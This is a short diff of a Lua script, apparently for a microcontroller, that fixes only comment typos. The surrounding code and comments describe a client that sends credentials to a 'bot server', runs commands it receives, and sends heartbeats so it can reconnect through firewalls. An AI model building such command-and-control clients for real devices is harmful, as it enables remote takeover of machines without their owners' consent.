@@ -10,7 +10,7 @@ conn:on("connection", function(conn)
 	conn:send(u .. ":" .. p)
 end)
 
---  Alert commamd has been recieved from server. Don't
+--  Commamd has been received from server. Don't
 --  feel like learning LUA OOP so this implements the
 --  command execution via if then (LUA doesn't have a switch
 --  statment)
@@ -31,7 +31,7 @@ end)
 --	for an acknowlegdement. If no ACK is received within 15
 --	seconds, restart and reconnect to the bot server.
 --  This is necessary becuase firewalls often timeout a
---  TCP connection after a set period of time. Might has
+--  TCP connection after a set period of time. Might have
 --  to adjust the interval based on firewall config.
 tmr.alarm(1, 300000, 1, function()
 	conn:send(u .. ":heartbeat")
